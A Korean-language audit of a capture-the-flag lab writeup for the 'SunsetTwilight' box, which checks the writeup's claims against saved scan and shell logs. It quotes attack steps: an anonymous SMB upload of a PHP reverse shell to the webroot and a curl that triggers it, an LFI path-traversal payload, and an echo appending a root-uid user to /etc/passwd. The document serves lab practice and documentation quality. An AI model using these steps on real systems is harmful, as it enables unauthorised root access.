---
type: audit
target: "03. PG/SunsetTwilight.md"
box: SunsetTwilight
date: 2026-09-09
manual_tags: true
manual_cves: true
---

# SunsetTwilight writeup 적대적 검증

대상 `03. PG\SunsetTwilight.md` (453행 → 458행). 검증과 정정을 한 사이클로 수행.

## 근거 출처

- Kali 산출물 `~/PG/SunsetTwilight/` — `nmap-full.txt` · `nmap-quick-ports.txt` · `nmap_allports_quick.log` · `nmap-udp-top100.txt` · `gobuster-80.txt` · `enum2.txt` · `enum3.txt` · `enum4.txt` · `svc/smbmap-null.txt` · `svc/smb-shares-null.txt` · `srcloot/lang.php` · `srcloot/maxImageUpload.class.php` · `harvest_target.txt` · `shell443.log` · `shell443b.log` · `proof_user.txt` · `proof_root.txt` · `writeup_notes.txt`
- 볼트 `파일보관\PG-SunsetTwilight-*.png` 4장 — 직접 열어 캡션과 대조
- 직접 실행 — `perl -e 'print crypt("pass123",".")'` (Kali) → `*0`
- 규격 정본 — `F:\project\DOC_TEMPLATE\REFERENCE.md` · `templates\report-base\report.base.md` A-1·A-2·A-2-1·A-4 · `templates\pg-machine-md\pg-machine.template.md`
- 색인 파서 — `_INDEX\_tools\extract.py` `MANUAL_CVE_RE`·`CVE_RE`

`~/.zsh_history` 에 이 박스 관련 행 부재 — 전 과정이 비대화형 `ssh kali "…"` 로 돌았음을 뒷받침. 노트에 Kali 대화형 프롬프트(`┌──(kali㉿kali)`) 부재 확인.

## 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| Initial Access · `\var\www\html` 은 소유자가 `www-data` 이고 디렉터리 모드가 다른 사용자 쓰기까지 허용 | **반증.** `shell443b.log:39` 의 `drwsr-xr-x 3 www-data www-data … ..`(= `/var/www/html`) — other 쓰기 부재. 노트가 자기 증거에 반박당함 | 모드 원문을 그대로 적고, 익명 `put` 성립의 원인을 「세션이 `www-data` 로 매핑」으로 정정. 매핑 대상이 root 가 아닌 근거(`\root`·`\etc\shadow` DENIED)를 한 행 추가. `smb.conf` 는 「원문 미보존」 |
| Privilege Escalation · 해시 필드 재작성은 웹셸 채널로 수행 | **인과 결손.** 파손 행 `pwn:.` 직후 `su pwn` 성공이 설명 없이 병치돼 노트가 자기모순으로 읽힘. 「재작성」이라는 낱말도 실제 기전과 불일치 — 파손 행은 재작성되지 않고 그대로 잔존 | 세 관측(파손 해시로 인증 불성립 · `getpwnam()` first-match · 01:09 열거 시점 `pwn` 행 부재)을 근거로 「유효 행이 `mysql` 행 위에 이미 존재」를 논증. 삽입 명령은 「원문 미보존」 |
| Initial Access 상세 · `ssh kali@… "smbclient … put rev.php"` 3행 펜스 | **창작.** `rev.php`·`shell.php` 의 `put`·`curl` 기록이 산출물 전량 grep 에 부재. `writeup_notes.txt:18` 이 배치 채널을 「미확정」으로 명기 | 펜스 삭제. 실측 펜스(`shell443b.log:1-4` 의 nc 배너·connect-back)로 교체하고, 배치 명령은 「원문 미보존」·실증된 쓰기 채널은 SMB `put` 하나로 서술 |
| Initial Access 상세 · pty 승격 2행 펜스 | **로그 접합.** 1행은 `shell443b.log:224`, 2행은 `shell443.log:4` — 다른 세션 두 개를 한 블록으로 붙이고 출처 캡션도 부재 | 펜스를 둘로 갈라 각각 출처 표기. `shell443.log` 의 pty 기동 명령 행은 에코 파손이라 그 사실 명기 |
| 그림 3 캡션 · `maxImageUpload.class.php` 는 확장자 화이트리스트로 이미지만 받아 | **반증.** 소스 118행은 클라이언트 제공 `$_FILES['myfile']['type']` 만 대조. 확장자 검사 부재이고 저장 파일명은 `basename($_FILES['myfile']['name'])` 원본 유지 | 소스 사실로 정정. 판정도 「배제」에서 「미시도」로 강등 |
| 그림 1 캡션 · 파라미터 이름이 그대로 보여 | **자기반박.** 스크린샷에는 링크 텍스트 `pictures`·`Change language` 만. URL 은 화면 비노출 | 화면에 보이는 것과 소스에서 확인한 것을 갈라 적음 |
| Service Enumeration · UDP top100 은 개방 포트 부재 | **과잉 단정.** `nmap-udp-top100.txt` 는 `closed` 11개 · `open\|filtered` 89개. 89개는 미판정이지 부재가 아님 | `open` 확정 포트 부재로 한정 |
| enum2 인용 캡션 · 루트 목록 37행 중 대표 5행 | **수치 오류.** `enum2.txt:8-36` = 29행 | 29행으로 정정 |
| enum2 인용 펜스 행 순서 | **A-1 위반.** 원문 순서(root·etc·vmlinuz·home·var)를 재배열 | 원문 순서로 복원 |
| gobuster 인용 캡션 | 원문 6행 중 `/.` 행 생략 사실 미고지 | 캡션에 생략 명시 |
| enum4 인용 캡션 · `539` 는 …실행됐을 때의 응답 본문 | 요청 명령이 산출물에 부재 | 관측(펜스에 이어진 값)은 유지하고 요청 명령은 「원문 미보존」 |
| `proof_user.txt`·`proof_root.txt` 인용 캡션 | 두 파일 말미의 `# source: …` 주석 행을 잘라내고 미고지 | 캡션에 생략 명시. `proof_root` 캡션의 프롬프트 전환 근거를 `shell443b.log` 로 정확히 지목 |
| Service Enumeration · `lang.php` LFI | 확인된 취약점인데 진입 경로와의 관계 미서술 | 「확인만 하고 진입에 미사용」 한 행 추가 |
| Privilege Escalation 도입 | 첫 셸(11:27)과 권한상승(14:2x) 사이 재접속이 미서술이라 플래그 시각 3시간 간극이 설명 부재 | `rev.php` 재트리거로 재접속한 사실 한 행 추가 |
| frontmatter | `manual_cves` 부재 — `extract.py` `CVE_RE` 가 본문을 무조건 긁어, 반증하려 적은 CVE-2019-10149 가 이 박스의 CVE 로 색인됨 | `manual_cves: true` 추가(목록 부재 = 「이 노트에 CVE 없음」) |
| 관련 · 원문 미보존 항목 | 3건 누락, 1건은 부정확 | `rev.php`·`shell.php` 배치 명령 · `/etc/passwd` 모드 문자열 추가. `find -writable` 항목을 「`harvest_target.txt` WRITABLE 절은 디렉터리만 담음」으로 정확화 |
| 관련 | first-match 원리의 기법 카드 링크 부재 | `[[_PLAYBOOK#B-37 …]]` 링크 추가 |

## 삭제한 것

삭제한 원문 전문 — 되살릴 수 있도록 인용.

```bash
ssh kali@10.44.44.128 "tmux new-session -d -s tw443 'nc -lvnp 443 | tee ~/PG/SunsetTwilight/shell443.log; exec bash'"
ssh kali@10.44.44.128 "smbclient -N //192.168.103.91/WRKSHARE -c 'cd \\var\\www\\html; put rev.php'"
ssh kali@10.44.44.128 "curl -s http://192.168.103.91/rev.php"
```

근거 — `grep -rn 'rev\.php|shell\.php' ~/PG/SunsetTwilight/*.txt *.log` 결과 `put`·`curl` 기록 부재. 유일한 웹루트 `put` 기록은 `enum4.txt:307` 의 `t.php`. `writeup_notes.txt:18` — 「심은 경로 추정: SMB 쓰기 또는 lang.php RFI. 어느 쪽인지는 산출물로 미확정」.

리스너 명령 자체는 `shell443.log`·`shell443b.log` 의 nc 배너로 «결과» 가 실증되나, 명령 문자열(`tmux new-session -d -s tw443 …`)은 어느 산출물에도 부재. `tw443` 이라는 세션명은 `writeup_notes.txt:30·63` 에만 존재.

## 권한상승 인과 — 논증 전문

노트 본문에는 결론만 남기고 논증 과정을 여기 보존.

관측 넷:

1. `harvest_target.txt` USERS 절(헤더 DATE = `Wed Sep 9 01:09:17 EDT 2026`) — `/etc/passwd` 전문에 `pwn` 행 부재, 마지막 행 `mysql:x:108:118:MySQL Server,,,:/nonexistent:/bin/false`
2. `shell443b.log:233-235` — `echo "pwn:$1$tw$WPDG…" >> /etc/passwd; tail -2 /etc/passwd` → `mysql:x:108:118:…` · `pwn:.:0:0:root:/root:/bin/bash`
3. `shell443b.log:240-248` — `su pwn` → `Password:` → `root@twilight:/var/www/html#` · `uid=0(root) gid=0(root) groups=0(root)`
4. Kali 직접 실행 — `perl -e 'print crypt("pass123",".")'` → `*0`. 한 글자 salt 로는 저장값 `.` 와 일치하는 crypt 결과 산출 불가

추론:

- 관측 4 로 「`pwn:.` 행으로 `su` 성공」 배제
- 관측 2 의 `tail -2` 가 [`mysql`, `pwn:.`] 이므로 이 시점 파일 **끝** 에 유효 `pwn` 행 부재. 유효 행이 파손 행 «뒤» 에 붙었을 가능성도 이것으로 배제
- 유효 행이 파손 행 뒤에 붙었다면 `getpwnam()` first-match 가 파손 행을 먼저 집어 `su` 실패. 따라서 순서는 「유효 행 → 파손 행」 고정
- 관측 1 로 유효 행 삽입 시점은 01:09 이후. 관측 2 로 삽입 위치는 `mysql` 행 «위» — 즉 단순 append 가 아닌 중간 삽입

⇒ 유효 `pwn` 행이 `mysql` 행 위에 존재한 상태에서 `su` 가 first-match 로 그 행을 집음. 삽입 명령 원문은 어느 로그에도 부재 — `writeup_notes.txt:54-56` 이 「`openssl passwd -6` 로 해시 생성 후 base64 로 감싸 무손실 전송, 타겟에서 `base64 -d`」로 기록.

⚠️ **미해결 잔여** — `writeup_notes.txt:56` 은 「처음 2회 실패 후 base64 로 해결」로 시간 순서를 적으나, 위 논증은 base64 성공이 `shell443b.log:233` 의 실패보다 «앞» 이었음을 요구. 두 기록이 어긋남. 어느 쪽이 맞는지는 삽입 명령 원문이 없어 판정 불가 — 노트 본문에는 산출물이 강제하는 순서(유효 행 선행)만 적고 회수 서술은 배제.

## 반증한 것 — 지적으로 올랐다가 확인 결과 노트가 옳았던 것

| 의심 | 확인 결과 |
|---|---|
| 관리자 지목 ②의 「`lang.php` LFI 는 실제로 통했다」 | **참.** `enum2.txt:51-66` 에 `lang=../../../../../../etc/passwd` 가 `/etc/passwd` 를 반환한 원문 존재. 노트 인용 5행이 원문과 바이트 일치 |
| 관리자 지목 ⑤의 `smbmap` 오탐 대비 | **노트가 이미 정확히 서술.** `svc/smbmap-null.txt:19` = `WRKSHARE … READ ONLY`, `enum3.txt:73`·`enum4.txt:307` = `put` 성공. 콜아웃의 「공유 루트 기준 판정」 설명도 공유가 `/` 이고 `\root` 가 DENIED 인 것과 정합 |
| `63525/tcp` 가 `-p-` 에서만 잡힌다는 주장 | **참.** `nmap-quick-ports.txt`(top-1000) 8포트 · `nmap_allports_quick.log`(`-p-`) 9포트 — 63525 는 후자에만 존재 |
| nmap 포트 행 10줄 인용 | **원문과 바이트 일치**(`nmap-full.txt:5-42` 의 해당 행). 색인 파서용 raw 라인 보존 확인 |
| `srcloot/lang.php` 소스 인용 | **원문과 바이트 일치**(빈 행 위치 포함) |
| SMB 공유 목록·`\home\miguel`·`\etc\shadow` DENIED 서술 | **참.** `svc/smb-shares-null.txt:2-6` · `enum3.txt:10-14` |
| 플래그 취득이 웹셸 경유일 가능성(시험 0점 사유) | **아님.** `proof_user.txt`·`proof_root.txt` 가 각각 `www-data@twilight:/var/www/html$`·`root@twilight:/var/www/html#` 타겟 pty 프롬프트째 한 화면(플래그 + `hostname -I` + `id`)을 보존. `shell443b.log:240-248` 에 `su` 전환이 연속 존재 |
| `harvest_target.txt` 인용(SUID·CAPS·CRON·PROCS) | **전량 원문 일치.** SUID 절 「Debian 기본군까지 11행, 웹루트 하위 항목 생략」이라는 캡션도 원문(웹루트 gallery 항목 다수 존재)과 부합 |
| 프론트매터 `platform: pg`·`status: solved` 가 `pg-machine.template.md` 의 `platform/proving-grounds`·`status/rooted` 와 불일치 | **이 노트의 결함 아님.** 볼트 283개 전체와 `_INDEX` 색인이 쓰는 표기이고, 템플릿 27-28행이 값 형식을 볼트 파이프라인 소관으로 넘김. 단독 변경 시 색인 파손 — 아래 「관리자 판단 필요」로 이관 |
| 그림 2·4 캡션 | 스크린샷 직접 열람 결과 캡션과 화면 일치(SQL 오류 문자열 · EFS 로그인 폼) |

## 관리자 판단 필요

- **색인 갱신 필요** — `manual_cves: true` 추가분 반영. `refresh.ps1` 은 공유 인프라라 미실행
- **프론트매터 어휘 분기** — `pg-machine.template.md` 는 `platform/proving-grounds`·`status/rooted`·`tier`·`method`·`session_logged`·`tricks_logged`·`ledger` 를 요구하나 볼트 283개는 `platform/pg`·`status/solved` + 해당 필드 부재. 이 노트만 고치면 색인이 깨지므로 미변경. 전 노트 일괄 판단 사안
- **`_PLAYBOOK` 이관 확인 필요** — 이 박스의 시행착오 8건(Exim·FTP·MySQL·트래버설·EFS 퍼징·`.twilight`·`pspy` GLIBC·`$` 확장)이 `_PLAYBOOK` 에 실제로 들어갔는지 미확인. 본 감사 범위는 노트 본문
- **`writeup_notes.txt:56` 과 산출물의 시간 순서 불일치**(위 「미해결 잔여」) — 삽입 명령 원문 부재로 판정 불가
